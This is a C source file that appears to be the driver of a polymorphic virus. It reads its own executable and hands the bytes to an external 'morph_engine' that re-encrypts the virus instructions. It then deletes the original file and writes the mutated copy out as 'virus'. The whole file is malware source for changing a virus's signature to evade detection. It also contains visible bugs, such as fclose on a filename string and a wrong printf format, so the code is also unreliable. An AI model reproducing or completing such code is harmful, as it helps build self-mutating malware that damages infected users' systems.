#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <time.h>
#include <string.h>
#include <unistd.h>

char *filename;

extern int morph_engine(char* exe_data, size_t virus_instruction_begin, size_t virus_encrypt_size, size_t virus_decrypt_offset);
// extern int decrypt_engine(char* exe_data,size_t full_addr_enc_begin ,size_t virus_instruction_begin, size_t virus_encrypt_size, size_t virus_decrypt_offset);
int getfilename(int argc, char *argv[]){

	// get the file name from argument
	filename = argv[0];

	return 0;
}

int polymorphic(unsigned long virus_instruction_begin, unsigned long virus_encrypt_size, unsigned long virus_decrypt_offset)
{


	// seed the random number generator
	srand(time(NULL));




	unsigned long full_addr_enc_begin = virus_instruction_begin;

	// to get offset just delete the most significant char
	char buffer1[15];
	sprintf(buffer1, "%06lx", (unsigned long)virus_instruction_begin);
	char *main_offset = buffer1;
	// write(1, main_offset, strlen(main_offset));
	main_offset = main_offset + 1;
	// write(1, main_offset, strlen(main_offset));
	printf("\n");

	char buffer3[15];
	sprintf(buffer3, "%06lx", (unsigned long)virus_decrypt_offset);
	char *decryption_offset = buffer3;
	decryption_offset = decryption_offset + 1;
	// write(1, decryption_offset, strlen(decryption_offset));

	// printf("\n");


      virus_instruction_begin  = (int)strtol(main_offset, NULL, 16);
	virus_decrypt_offset  = (int)strtol(decryption_offset, NULL, 16);

      printf("%ul\n", virus_instruction_begin);
      printf("%ul\n", virus_decrypt_offset);


	// /* Append these values from manual input via objdump*/
	// virus_instruction_begin = 4656;
	// virus_encrypt_size = 2608;
	// virus_decrypt_offset = 7502;


	FILE *f = fopen(filename, "rb");
	fseek(f, 0, SEEK_END);
	long fsize = ftell(f);
	fseek(f, 0, SEEK_SET);  /* same as rewind(f); */

	char *string = malloc(fsize + 1);
	if(!string)
	{
			fclose(filename);
			printf("Executable data allocation failed\n");
			return 1;
	}
	fread(string, 1, fsize, f);
	fclose(f);



	// call the polymorphic engine
	if(morph_engine(string, virus_instruction_begin, virus_encrypt_size, virus_decrypt_offset) != 0)
	{
		printf("An error occured in the polymorphic engine\n");

	}

	remove(filename);


	FILE* out_file = fopen("virus", "wb");
	// write the modified executable data
	fwrite(string, fsize, 1, out_file);
	fclose(out_file);


	free(string);
	return 0;

}